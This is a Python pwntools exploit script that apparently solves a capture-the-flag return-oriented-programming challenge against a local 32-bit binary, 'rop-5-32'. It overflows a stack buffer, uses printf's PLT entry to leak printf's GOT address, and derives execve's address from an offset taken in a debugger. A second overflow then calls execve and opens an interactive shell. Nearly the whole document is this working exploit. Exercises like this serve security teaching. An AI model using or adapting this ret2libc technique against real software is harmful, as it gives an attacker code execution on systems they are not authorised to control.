#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-5-32')

printf_got = p.elf.got['printf']
printf_plt = p.elf.plt['printf']
input_func = p.elf.symbols['input_func']

print("GOT: %s" % hex(printf_got))
print ("PLT: %s" % hex(printf_plt))


buf = "A" * 0x88 + "BBBB"


buf += p32(printf_plt)
buf += p32(input_func)
buf += p32(printf_got)

print(p.recv())

p.sendline(buf)

data = p.recv()
print(repr(data))

cut_data = data[9 + len(buf):]
print_addr_raw = cut_data[:4]

printf_addr = u32(print_addr_raw)
print(hex(printf_addr))

"""
pwndbg> print printf
$1 = {<text variable, no debug info>} 0xf7df5670 <__printf>
pwndbg> print execve
$2 = {<text variable, no debug info>} 0xf7e5c7e0 <execve>
"""
offset = 0xf7e5c7e0 - 0xf7df5670  #execve - printf
execve_addr = printf_addr + offset

buf = "A" * 0x88 + "BBBB"
buf += p32(execve_addr)
buf += p32(0)

#0x80486b0 = @

buf += p32(0x80486b0)
buf += p32(0) + p32(0)

with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()

